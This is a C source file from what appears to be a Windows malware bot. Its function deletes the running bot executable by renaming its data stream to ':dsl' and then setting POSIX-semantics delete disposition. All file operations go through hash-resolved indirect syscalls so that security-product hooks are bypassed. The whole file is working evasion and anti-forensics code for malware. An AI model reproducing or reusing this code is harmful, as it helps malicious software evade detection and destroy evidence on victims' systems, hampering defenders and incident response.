#include "suicide.h"
#include "Core/syscalls.h"
#include "Core/api_resolve.h"
#include "Crypto/hashing.h"
#include "Utils/helpers.h"
#include "Core/ntdefs.h"



void Internal_Suicide(const wchar_t* botPath) {
    HANDLE hFile = NULL;
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uPath;
    SYSCALL_GATE gate;
    
    //convert DOS Path to NT Path
    wchar_t ntPath[MAX_PATH + 6] = L"\\??\\";
    wcscat_s(ntPath, MAX_PATH + 6, botPath);


    mRtlInitUnicodeString(&uPath, ntPath);
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL); 

    //Stage 1: Rename stream
    
    //NtOpenFile (DELETE | SYNCHRONIZE rights)
    gate = GetSSNByHash(0X441098F16BE8639); 
    if (gate.wServiceId != 0) {
        PREPARE_SYSCALL(gate); 
        status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)(0x00010000L | 0x00100000L), (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)1, (ULONG_PTR)0x00000020, 0, 0, 0, 0, 0); 
    }

    if (status == 0 && hFile) {
        BYTE renameBuffer[256] = {0}; 
        PFILE_RENAME_INFORMATION pRename = (PFILE_RENAME_INFORMATION)renameBuffer;
        
        const wchar_t* streamName = L":dsl";
        SIZE_T streamLen = wcslen(streamName) * sizeof(wchar_t);
        
        pRename->ReplaceIfExists = TRUE;
        pRename->RootDirectory = NULL;
        pRename->FileNameLength = (ULONG)streamLen;
        
        custom_memcpy(pRename->FileName, (PVOID)streamName, streamLen); 

        SIZE_T renameStructSize = sizeof(FILE_RENAME_INFORMATION) + streamLen;

        //NtSetInformationFile (FileRenameInformation)
        gate = GetSSNByHash(0XF74FD0B30EFD1299); 
        if (gate.wServiceId != 0) {
            PREPARE_SYSCALL(gate);
            IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)&ioStatus, (ULONG_PTR)pRename, (ULONG_PTR)renameStructSize, (ULONG_PTR)10, 0, 0, 0, 0, 0, 0);
        }

        //NtClose
        gate = GetSSNByHash(0X4F3163BAF74EFD5D); 
        if (gate.wServiceId != 0) {
            PREPARE_SYSCALL(gate);
            IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
    }

    // Stage 2: Disposition
    
    
    //NtOpenFile
    gate = GetSSNByHash(0X441098F16BE8639); 
    if (gate.wServiceId != 0) {
        PREPARE_SYSCALL(gate);
        status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)(0x00010000L | 0x00100000L), (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)1, (ULONG_PTR)0x00000020, 0, 0, 0, 0, 0); 
    }

    if (status == 0 && hFile) {
        FILE_DISPOSITION_INFORMATION_EX fDeleteEx = {0};
        fDeleteEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;

        // NtSetInformationFile (FileDispositionInformationEx)
        gate = GetSSNByHash(0XF74FD0B30EFD1299); 
        if (gate.wServiceId != 0) {
            PREPARE_SYSCALL(gate);
            IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)&ioStatus, (ULONG_PTR)&fDeleteEx, (ULONG_PTR)sizeof(fDeleteEx), (ULONG_PTR)64, 0, 0, 0, 0, 0, 0); 
        }

        // NtClose
        gate = GetSSNByHash(0X4F3163BAF74EFD5D); 
        if (gate.wServiceId != 0) {
            PREPARE_SYSCALL(gate);
            IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
    }

    exit(0);
}
